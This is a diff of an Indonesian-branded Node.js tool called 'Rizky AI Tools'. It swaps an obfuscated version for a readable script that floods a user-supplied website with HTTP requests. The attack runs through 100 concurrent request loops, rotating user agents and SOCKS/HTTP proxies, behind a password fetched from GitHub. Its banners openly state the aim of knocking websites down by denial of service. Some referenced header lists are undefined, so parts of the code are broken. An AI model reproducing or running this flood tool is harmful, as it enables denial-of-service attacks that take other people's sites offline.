@@ -2,7 +2,7 @@
 ╭━𓊈 𝐑𝐈𝐙𝐊𝐘 𝐀𝐈 𝐓𝐎𝐎𝐋𝐒 𓊉━═╣
 ║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : ⚙️ 𝐑𝐢𝐳𝐤𝐲-𝐀𝐢 ⚙️
 ┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽  : 2.2
-║𝙰𝚄𝚃𝙷𝙾𝚁   : 𝐑𝐢𝐳𝐤𝐲 𝐜𝐲𝐛𝐞𝐫
+║𝙰𝚄𝚃𝙷𝙾𝚁    : 𝐑𝐢𝐳𝐤𝐲 𝐜𝐲𝐛𝐞𝐫
 ║📅 𝗗𝗶𝗯𝘂𝗮𝘁 : Minggu, 27 Juli 2025
 ╰━━━━━━━━━━━━━━━━━━━━━━━═╣
 
@@ -14,10 +14,235 @@
 ┃ 🚫 𝗗𝗜𝗟𝗔𝗥𝗔𝗡𝗚 𝗦𝗘𝗕𝗔𝗥 𝗧𝗔𝗡𝗣𝗔 𝗜𝗭𝗜𝗡
 ┃ 😆 𝗖𝗢𝗣𝗬 𝗣𝗔𝗦𝗧𝗘 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗛𝗜𝗗𝗨𝗣 𝗟𝗘𝗕𝗜𝗛 𝗥𝗜𝗦𝗜𝗞𝗢
 ┃ 📱 𝗛𝗨𝗕𝗨𝗡𝗚𝗜 𝗔𝗗𝗠𝗜𝗡 : 6283850540570
-┃ 📺 𝗧𝗜𝗞𝗧𝗢𝗞 𝗔𝗗𝗠𝗜𝗡   : https://www.tiktok.com/@rizky.cyber
+┃ 📺 𝗧𝗜𝗞𝗧𝗢𝗞 𝗔𝗗𝗠𝗜𝗡     : https://www.tiktok.com/@rizky.cyber
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 🤣 Ngoding boleh nyolong jangan!
 🤣 Yang gratisan itu nasi di hajatan bukan script gue 😎
 */
-const _0x315203=_0x412d;(function(_0x45131b,_0x24bdbf){const _0x5cc8ff=_0x412d,_0x5555d5=_0x45131b();while(!![]){try{const _0x38c669=-parseInt(_0x5cc8ff(0x11d))/0x1+parseInt(_0x5cc8ff(0x11b))/0x2*(-parseInt(_0x5cc8ff(0xf0))/0x3)+parseInt(_0x5cc8ff(0xf5))/0x4*(parseInt(_0x5cc8ff(0x102))/0x5)+parseInt(_0x5cc8ff(0x11e))/0x6+parseInt(_0x5cc8ff(0xf6))/0x7*(-parseInt(_0x5cc8ff(0x10e))/0x8)+parseInt(_0x5cc8ff(0x12e))/0x9+parseInt(_0x5cc8ff(0xf9))/0xa;if(_0x38c669===_0x24bdbf)break;else _0x5555d5['push'](_0x5555d5['shift']());}catch(_0x722b16){_0x5555d5['push'](_0x5555d5['shift']());}}}(_0x46db,0x9dfce));function _0x46db(){const _0x2bfe8d=['response','╰━━━━━━━━━━━━━╯\x1b[0m\x0a','://','3124815IYAVwF','readline','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','┃\x20⚙️\x20\x1b[38;5;190m𝗠𝗘𝗡𝗬𝗘𝗥𝗔𝗡𝗚\x20𝗧𝗔𝗥𝗚𝗘𝗧\x20𝗗𝗘𝗡𝗚𝗔𝗡\x20𝗗𝗢𝗦\x20⚙️\x1b[38;5;46m','error','4970648oiMQhg','4228189pUjQhh','Error:\x20','┃═════════════════════════════════','7515860owEYPS','https://rizky598.github.io/api/password.json','┃⚠️\x20\x1b[38;5;196m\x20𝗘𝗙𝗘𝗞\x20\x20\x20\x20:\x20\x1b[0mʙɪꜱᴀ\x20ʙɪᴋɪɴ\x20ᴡᴇʙꜱɪᴛᴇ\x20ᴅᴏᴡɴ\x20ᴘᴀᴋᴀɪʟᴀʜ\x20ᴅᴇɴɢᴀɴ\x20ʙɪᴊᴀᴋ','split','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','floor','\x1b[38;5;196m⛔\x20Password\x20salah!\x20Akses\x20ditolak.\x1b[0m\x0a','socks-proxy-agent','5bKIAWL','\x1b[0m','╭━𓊈\x20\x1b[38;5;82m𝗥𝗜𝗭𝗞𝗬\x20𝗔𝗜\x1b[38;5;46m\x20-\x20\x1b[38;5;82m𝗗𝗢𝗦\x20𝗠𝗢𝗗𝗘\x1b[38;5;46m\x20𓊉━═╣','\x1b[31m⚠️\x20Gagal\x20mengambil\x20password\x20dari\x20server\x20GitHub.\x1b[0m','password','exit','socks5','length','┃\x20URL\x20tidak\x20valid!','wx.txt','then','Failed\x20to\x20read\x20proxy\x20list:\x20','16Bithfj','readFileSync','axios','Error:\x20Request\x20failed\x20with\x20status\x20code\x20502','https-proxy-agent','Trailers','\x1b[38;5;82m[🌐]\x20URL\x20Target:\x1b[0m','question','\x1b[38;5;196m╭━⛔\x20𝗘𝗥𝗥𝗢𝗥\x20━╮','╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣','stdout','map','\x1b[38;5;208m[🔒]\x20Masukkan\x20Password:\x20\x1b[0m','2lqXEJy','┃🕒\x20\x1b[38;5;190m𝗣𝗘𝗦𝗔𝗡\x20\x20\x20:\x20\x1b[0mᴊᴀɴɢᴀɴ\x20ꜱᴇʀᴀɴɢ\x20ᴡᴇʙꜱɪᴛᴇ\x20ᴛᴇʀʟᴀʟᴜ\x20ʟᴀᴍᴀ','335191FnNJaq','3138936AqvLcl','status','┃📡\x20\x1b[38;5;220m𝗣𝗥𝗢𝗚𝗥𝗘𝗦\x20:\x20\x1b[0mꜱᴇᴅᴀɴɢ\x20ᴍᴇɴɢɪʀɪᴍ\x20ʀᴇQᴜᴇꜱᴛ\x20ᴋᴇ\x20ᴛᴀʀɢᴇᴛ','get','catch','ua.txt','Max\x20requests\x20reached','utf-8','Failed\x20to\x20read\x20user\x20agent\x20list:\x20','stdin','replace','socks','startsWith','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','log','\x1b[38;5;40m╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣\x1b[0m','6431076hNXHUr','\x1b[38;5;40m┃📥\x20ᴍᴀꜱᴜᴋᴋᴀɴ\x20ᴜʀʟ\x20ᴛᴀʀɢᴇᴛ\x20ᴜɴᴛᴜᴋ\x20ᴅɪꜱᴇʀᴀɴɢ\x1b[0m','message','trim'];_0x46db=function(){return _0x2bfe8d;};return _0x46db();}const axios=require(_0x315203(0x110)),fs=require('fs'),SocksProxyAgent=require(_0x315203(0x101)),HttpsProxyAgent=require(_0x315203(0x112)),readline=require(_0x315203(0xf1)),proxyF='proxy.txt',uaLF=_0x315203(0x123),userAgents=_0x315203(0x10b),acceptHeader=['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',_0x315203(0xf2),_0x315203(0xfd),_0x315203(0xfe),_0x315203(0x12b)];function readProxy(){const _0x4a4894=_0x315203;try{const _0x13fa48=fs[_0x4a4894(0x10f)](proxyF,'utf8');return _0x13fa48[_0x4a4894(0xec)]()['split']('\x0a')[_0x4a4894(0x119)](_0x21fd9a=>_0x21fd9a[_0x4a4894(0xec)]());}catch(_0xa9a05f){return console['error'](_0x4a4894(0x10d)+_0xa9a05f),[];}}function readUA(){const _0x4d2d85=_0x315203;try{const _0x2f09d0=fs[_0x4d2d85(0x10f)](uaLF,_0x4d2d85(0x125))[_0x4d2d85(0x128)](/\r/g,'')[_0x4d2d85(0xfc)]('\x0a');return _0x2f09d0[_0x4d2d85(0x119)](_0x42c189=>_0x42c189['trim']());}catch(_0x1c8d4a){return console[_0x4d2d85(0xf4)](_0x4d2d85(0x126)+_0x1c8d4a),[];}}function sanitizeUA(_0x33433b){const _0x22f034=_0x315203;return _0x33433b[_0x22f034(0x128)](/[^\x20-\x7E]/g,'');}function randElement(_0x33bdb3){const _0x3c22f=_0x315203;return _0x33bdb3[Math[_0x3c22f(0xff)](Math['random']()*_0x33bdb3[_0x3c22f(0x109)])];}const delay=0x0;function sendReq(_0x362f37,_0x3b71cb,_0x298dbb){const _0x5bd369=_0x315203,_0x1c9e0f=sanitizeUA(randElement(userAgents)),_0x2b3b1d={'User-Agent':_0x1c9e0f,'Accept':randElement(acceptHeader),'Accept-Encoding':randElement(encodingHeader),'Accept-Language':randElement(langHeader),'Referer':randElement(refers),'Cache-Control':randElement(cplist),'DNT':'1','Connection':'keep-alive','Upgrade-Insecure-Requests':'1','TE':_0x5bd369(0x113)};axios['get'](_0x362f37,{'httpAgent':_0x3b71cb,'headers':_0x2b3b1d,'timeout':0x0})[_0x5bd369(0x10c)](_0x276b6f=>{setTimeout(()=>sendReq(_0x362f37,_0x3b71cb,_0x298dbb),0x0);})[_0x5bd369(0x122)](_0x5bd13=>{const _0x324753=_0x5bd369;if(_0x5bd13[_0x324753(0xed)]&&_0x5bd13[_0x324753(0xed)][_0x324753(0x11f)]===0x1f7)console['log']('wkwk');else _0x5bd13['response']&&_0x5bd13[_0x324753(0xed)][_0x324753(0x11f)]===0x1f6?console[_0x324753(0x12c)](_0x324753(0x111)):console[_0x324753(0x12c)](_0x324753(0xf7)+_0x5bd13['message']);setTimeout(()=>sendReq(_0x362f37,_0x3b71cb,_0x298dbb),0x0);});}function _0x412d(_0xab05cc,_0x1873b4){const _0x46dbc7=_0x46db();return _0x412d=function(_0x412df6,_0x5a4df6){_0x412df6=_0x412df6-0xeb;let _0x4d4707=_0x46dbc7[_0x412df6];return _0x4d4707;},_0x412d(_0xab05cc,_0x1873b4);}function sendReqs(_0x2e33e4){const _0x4b1ee9=_0x315203,_0x53cdd3=readProxy(),_0x313f00=readUA();if(_0x53cdd3[_0x4b1ee9(0x109)]>0x0){const _0x17b696=randElement(_0x53cdd3),_0x335aca=_0x17b696[_0x4b1ee9(0xfc)](':'),_0x943f7e=_0x335aca[0x0][_0x4b1ee9(0x12a)](_0x4b1ee9(0x129))?_0x4b1ee9(0x108):'http',_0x444ec8=_0x943f7e+_0x4b1ee9(0xef)+_0x335aca[0x0]+':'+_0x335aca[0x1],_0x24a1cb=_0x943f7e==='socks5'?new SocksProxyAgent(_0x444ec8):new HttpsProxyAgent(_0x444ec8);sendReq(_0x2e33e4,_0x24a1cb,randElement(_0x313f00));}else sendReq(_0x2e33e4,null,randElement(_0x313f00));}const rl=readline['createInterface']({'input':process[_0x315203(0x127)],'output':process[_0x315203(0x118)]});async function getPasswordFromGitHub(){const _0x200307=_0x315203;try{const _0x2e6ac1=await axios[_0x200307(0x121)](_0x200307(0xfa));return _0x2e6ac1['data'][_0x200307(0x106)];}catch(_0x479d8a){console[_0x200307(0x12c)](_0x200307(0x105)),process[_0x200307(0x107)](0x1);}}async function askPassword(){const _0x3951c9=_0x315203,_0xaf5f6e=await getPasswordFromGitHub();rl[_0x3951c9(0x115)](_0x3951c9(0x11a),_0x36d264=>{const _0x38b45f=_0x3951c9;_0x36d264!==_0xaf5f6e?(console[_0x38b45f(0x12c)](_0x38b45f(0x100)),askPassword()):showMenu();});}function showMenu(){console['log']('\x0a╭━𓊈\x20𝐑𝐈𝐙𝐊𝐘\x20𝐀𝐈\x20𝐓𝐎𝐎𝐋𝐒\x20𓊉━═╣\x0a║𝙱𝙾𝚃\x20𝙽𝙰𝙼𝙴\x20:\x20⚙️\x20𝐑𝐢𝐳𝐤𝐲-𝐀𝐢\x20⚙️\x0a┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽\x20\x20:\x202.2\x0a║𝙰𝚄𝚃𝙷𝙾𝚁\x20\x20\x20:\x20𝐑𝐢𝐳𝐤𝐲\x20𝐜𝐲𝐛𝐞𝐫\x0a╰━━━━━━━━━━━━━━━━━━━━━━━═╣\x0a\x0a┏━━『\x20⚠️\x20𝗣𝗘𝗥𝗜𝗡𝗚𝗔𝗧𝗔𝗡\x20』\x0a╿☒\x20⧽\x20𝗝𝗔𝗡𝗚𝗔𝗡\x20𝗦𝗘𝗥𝗔𝗡𝗚\x20𝗦𝗜𝗧𝗨𝗦\x20𝗣𝗘𝗠𝗘𝗥𝗜𝗡𝗧𝗔𝗛\x0a╽☒\x20⧽\x20𝗝𝗔𝗡𝗚𝗔𝗡\x20𝗦𝗘𝗥𝗔𝗡𝗚\x20𝗦𝗜𝗧𝗨𝗦\x20𝗣𝗘𝗡𝗗𝗜𝗗𝗜𝗞𝗔𝗡\x0a┗━━━━━━━━━━━━━━━━━━━━━━━━\x0a'),askForUrl();}function askForUrl(){const _0x21769c=_0x315203;console[_0x21769c(0x12c)]('\x1b[38;5;40m╭━𓊈\x20𝗥𝗜𝗭𝗞𝗬\x20𝗔𝗜\x20-\x20𝗨𝗥𝗟\x20𝗜𝗡𝗣𝗨𝗧\x20𓊉━═╣\x1b[0m'),console['log'](_0x21769c(0x12f)),console[_0x21769c(0x12c)](_0x21769c(0x12d)),rl[_0x21769c(0x115)](_0x21769c(0x114),_0x2789ee=>{const _0x34083e=_0x21769c;if(!_0x2789ee[_0x34083e(0x12a)]('http://')&&!_0x2789ee[_0x34083e(0x12a)]('https://'))console[_0x34083e(0x12c)](_0x34083e(0x116)),console[_0x34083e(0x12c)](_0x34083e(0x10a)),console[_0x34083e(0x12c)]('┃\x20Harus\x20diawali\x20dengan\x20\x22http://\x22\x20atau\x20\x22https://\x22'),console['log'](_0x34083e(0xee)),askForUrl();else{console[_0x34083e(0x12c)]('\x1b[38;5;46m'),console['log'](_0x34083e(0x104)),console['log'](_0x34083e(0xf3)),console[_0x34083e(0x12c)](_0x34083e(0xf8)),console[_0x34083e(0x12c)](_0x34083e(0x120)),console[_0x34083e(0x12c)](_0x34083e(0x11c)),console[_0x34083e(0x12c)](_0x34083e(0xfb)),console[_0x34083e(0x12c)](_0x34083e(0x117)),console[_0x34083e(0x12c)](_0x34083e(0x103));let _0x37ebad=!![];const _0xf84dc7=0x8e679c2f5e450000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,_0x48bfea=0x3a5437c8091f2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,_0x3d7685=()=>{const _0x2aa167=_0x34083e;try{if(!_0x37ebad)return;const _0x7c15af=randElement(userAgents),_0x53f2ee={'User-Agent':_0x7c15af};axios['get'](_0x2789ee,{'headers':_0x53f2ee})[_0x2aa167(0x10c)](_0x4cab24=>{const _0x5cc49f=_0x2aa167;if(_0x4cab24[_0x5cc49f(0x11f)]===0x1f7){}})['catch'](_0x471bfc=>{const _0x4f9768=_0x2aa167;if(_0x471bfc[_0x4f9768(0xed)]&&_0x471bfc['response'][_0x4f9768(0x11f)]===0x1f6){}}),setTimeout(_0x3d7685,0x3e8/_0x48bfea);}catch(_0x280876){console['log']('Error:\x20'+_0x280876[_0x2aa167(0xeb)]),setTimeout(_0x3d7685,0x3e8/_0x48bfea);}},_0x3b03e1=0x64;for(let _0xfdef9a=0x0;_0xfdef9a<_0x3b03e1;_0xfdef9a++){_0x3d7685();}setTimeout(()=>{const _0x2f42ab=_0x34083e;_0x37ebad=![],console[_0x2f42ab(0x12c)](_0x2f42ab(0x124)),askForUrl();},_0xf84dc7/_0x48bfea*0x3e8);}});}askPassword();
+const axios = require('axios');
+const fs = require('fs');
+const SocksProxyAgent = require('socks-proxy-agent');
+const HttpsProxyAgent = require('https-proxy-agent');
+const readline = require('readline');
+
+const proxyF = "proxy.txt";
+const uaLF = "ua.txt";
+const userAgents = "wx.txt";
+
+const acceptHeader = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+];
+
+function readProxy() {
+    try {
+        const data = fs.readFileSync(proxyF, "utf8");
+        return data.trim().split("\n").map((line) => line.trim());
+    } catch (error) {
+        console.error(`Failed to read proxy list: ${error}`);
+        return [];
+    }
+}
+
+function readUA() {
+    try {
+        const data = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n");
+        return data.map((line) => line.trim());
+    } catch (error) {
+        console.error(`Failed to read user agent list: ${error}`);
+        return [];
+    }
+}
+
+function sanitizeUA(userAgent) {
+    return userAgent.replace(/[^\x20-\x7E]/g, "");
+}
+
+function randElement(arr) {
+    return arr[Math.floor(Math.random() * arr.length)];
+}
+
+const delay = 0;
+
+function sendReq(target, agent, userAgent) {
+    const sanitizedUserAgent = sanitizeUA(randElement(userAgents));
+    const headers = {
+        "User-Agent": sanitizedUserAgent,
+        Accept: randElement(acceptHeader),
+        "Accept-Encoding": randElement(encodingHeader),
+        "Accept-Language": randElement(langHeader),
+        Referer: randElement(refers),
+        "Cache-Control": randElement(cplist),
+        DNT: "1",
+        Connection: "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        TE: "Trailers",
+    };
+
+    axios
+        .get(target, { httpAgent: agent, headers: headers, timeout: 0 })
+        .then((_) => {
+            setTimeout(() => sendReq(target, agent, userAgent), 0);
+        })
+        .catch((error) => {
+            if (error.response && error.response.status === 503) {
+                console.log("wkwk");
+            } else if (error.response && error.response.status === 502) {
+                console.log("Error: Request failed with status code 502");
+            } else {
+                console.log("Error: " + error.message);
+            }
+            setTimeout(() => sendReq(target, agent, userAgent), 0);
+        });
+}
+
+function sendReqs(targetUrl) {
+    const proxies = readProxy();
+    const userAgentsList = readUA();
+
+    if (proxies.length > 0) {
+        const proxy = randElement(proxies);
+        const proxyParts = proxy.split(":");
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+        const agent = proxyProtocol === "socks5"
+            ? new SocksProxyAgent(proxyUrl)
+            : new HttpsProxyAgent(proxyUrl);
+
+        sendReq(targetUrl, agent, randElement(userAgentsList));
+    } else {
+        sendReq(targetUrl, null, randElement(userAgentsList));
+    }
+}
+
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+// ✅ Tambahan fungsi ambil password dari GitHub
+async function getPasswordFromGitHub() {
+    try {
+        const response = await axios.get('https://rizky598.github.io/api/password.json');
+        return response.data.password;
+    } catch (error) {
+        console.log('\x1b[31m⚠️ Gagal mengambil password dari server GitHub.\x1b[0m');
+        process.exit(1);
+    }
+}
+
+// 🔐 Ubah fungsi askPassword() agar ambil dari API
+async function askPassword() {
+    const serverPassword = await getPasswordFromGitHub();
+    rl.question('\x1b[38;5;208m[🔒] Masukkan Password: \x1b[0m', (password) => {
+        if (password !== serverPassword) {
+            console.log('\x1b[38;5;196m⛔ Password salah! Akses ditolak.\x1b[0m\n');
+            askPassword(); // ulangi
+        } else {
+            showMenu();
+        }
+    });
+}
+
+function showMenu() {
+    console.log(`
+╭━𓊈 𝐑𝐈𝐙𝐊𝐘 𝐀𝐈 𝐓𝐎𝐎𝐋𝐒 𓊉━═╣
+║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : ⚙️ 𝐑𝐢𝐳𝐤𝐲-𝐀𝐢 ⚙️
+┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽  : 2.2
+║𝙰𝚄𝚃𝙷𝙾𝚁   : 𝐑𝐢𝐳𝐤𝐲 𝐜𝐲𝐛𝐞𝐫
+╰━━━━━━━━━━━━━━━━━━━━━━━═╣
+
+┏━━『 ⚠️ 𝗣𝗘𝗥𝗜𝗡𝗚𝗔𝗧𝗔𝗡 』
+╿☒ ⧽ 𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗘𝗥𝗔𝗡𝗚 𝗦𝗜𝗧𝗨𝗦 𝗣𝗘𝗠𝗘𝗥𝗜𝗡𝗧𝗔𝗛
+╽☒ ⧽ 𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗘𝗥𝗔𝗡𝗚 𝗦𝗜𝗧𝗨𝗦 𝗣𝗘𝗡𝗗𝗜𝗗𝗜𝗞𝗔𝗡
+┗━━━━━━━━━━━━━━━━━━━━━━━━
+`);
+    askForUrl();
+}
+
+function askForUrl() {
+    console.log('\x1b[38;5;40m╭━𓊈 𝗥𝗜𝗭𝗞𝗬 𝗔𝗜 - 𝗨𝗥𝗟 𝗜𝗡𝗣𝗨𝗧 𓊉━═╣\x1b[0m');
+    console.log('\x1b[38;5;40m┃📥 ᴍᴀꜱᴜᴋᴋᴀɴ ᴜʀʟ ᴛᴀʀɢᴇᴛ ᴜɴᴛᴜᴋ ᴅɪꜱᴇʀᴀɴɢ\x1b[0m');
+    console.log('\x1b[38;5;40m╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣\x1b[0m');
+
+    rl.question('\x1b[38;5;82m[🌐] URL Target:\x1b[0m', (url) => {
+        if (!url.startsWith("http://") && !url.startsWith("https://")) {
+            console.log('\x1b[38;5;196m╭━⛔ 𝗘𝗥𝗥𝗢𝗥 ━╮');
+            console.log('┃ URL tidak valid!');
+            console.log('┃ Harus diawali dengan "http://" atau "https://"');
+            console.log('╰━━━━━━━━━━━━━╯\x1b[0m\n');
+            askForUrl(); // tanya ulang
+        } else {
+     
+console.log("\x1b[38;5;46m");
+console.log("╭━𓊈 \x1b[38;5;82m𝗥𝗜𝗭𝗞𝗬 𝗔𝗜\x1b[38;5;46m - \x1b[38;5;82m𝗗𝗢𝗦 𝗠𝗢𝗗𝗘\x1b[38;5;46m 𓊉━═╣");
+console.log("┃ ⚙️ \x1b[38;5;190m𝗠𝗘𝗡𝗬𝗘𝗥𝗔𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗡𝗚𝗔𝗡 𝗗𝗢𝗦 ⚙️\x1b[38;5;46m");
+console.log("┃═════════════════════════════════");
+console.log("┃📡 \x1b[38;5;220m𝗣𝗥𝗢𝗚𝗥𝗘𝗦 : \x1b[0mꜱᴇᴅᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ʀᴇQᴜᴇꜱᴛ ᴋᴇ ᴛᴀʀɢᴇᴛ");
+console.log("┃🕒 \x1b[38;5;190m𝗣𝗘𝗦𝗔𝗡   : \x1b[0mᴊᴀɴɢᴀɴ ꜱᴇʀᴀɴɢ ᴡᴇʙꜱɪᴛᴇ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ");
+console.log("┃⚠️ \x1b[38;5;196m 𝗘𝗙𝗘𝗞    : \x1b[0mʙɪꜱᴀ ʙɪᴋɪɴ ᴡᴇʙꜱɪᴛᴇ ᴅᴏᴡɴ ᴘᴀᴋᴀɪʟᴀʜ ᴅᴇɴɢᴀɴ ʙɪᴊᴀᴋ");
+console.log("╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣");
+
+let percent = 0;
+const width = 20;
+
+setInterval(() => {
+    const filled = Math.floor(percent / (100 / width));
+    const empty = width - filled;
+    const bar = '█'.repeat(filled) + '▒'.repeat(empty);
+    process.stdout.write(`\r\x1b[38;5;46m[${bar}] ${percent}%`);
+    percent += 5;
+    if (percent > 100) percent = 0; // Reset ke 0% setelah 100%
+}, 150);
+
+            let continueAttack = true;
+            const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+
+            const requestsPerSecond = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+
+            const attack = () => {
+                try {
+                    if (!continueAttack) return;
+
+                    const userAgent = randElement(userAgents);
+                    const headers = {
+                        'User-Agent': userAgent
+                    };
+
+                    axios.get(url, { headers })
+                        .then((response) => {
+                            if (response.status === 503) {
+                            }
+                        })
+                        .catch((error) => {
+                            if (error.response && error.response.status === 502) {
+                            }
+                        });
+
+                    setTimeout(attack, 1000 / requestsPerSecond);
+                } catch (error) {
+                    console.log("Error: " + error.message);
+                    setTimeout(attack, 1000 / requestsPerSecond);
+                }
+            };
+
+            const numThreads = 100;
+            for (let i = 0; i < numThreads; i++) {
+                attack();
+            }
+
+            setTimeout(() => {
+                continueAttack = false;
+                console.log('Max requests reached');
+                askForUrl();
+            }, maxRequests / requestsPerSecond * 1000);
+        }
+    });
+}
+
+// 🔐 Mulai dengan minta password
+askPassword();
